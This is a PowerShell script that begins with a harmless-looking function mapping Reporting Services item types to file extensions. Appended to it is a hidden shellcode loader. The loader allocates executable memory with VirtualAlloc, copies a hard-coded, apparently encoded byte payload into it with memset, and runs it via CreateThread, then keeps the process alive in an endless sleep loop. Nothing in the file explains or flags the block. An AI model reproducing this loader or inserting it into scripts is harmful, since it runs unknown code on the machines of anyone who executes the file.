﻿function Get-FileExtension
{
    param(
        [Parameter(Mandatory=$True)]
        [string]$TypeName
    )
    switch ($TypeName)
    {
        'Report'     { return '.rdl' }
        'DataSource' { return '.rsds' }
        'DataSet'    { return '.rsd' }
        'MobileReport' { return '.rsmobile' }
        'PowerBIReport' { return '.pbix' }
        'ExcelWorkbook' { return '' }
        'Resource' { return '' }
        'Kpi' { return '.kpi' }
        default      { throw 'Unsupported item type! We only support items which are of type Report, DataSet, DataSource, Mobile Report or Power BI Report' }
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

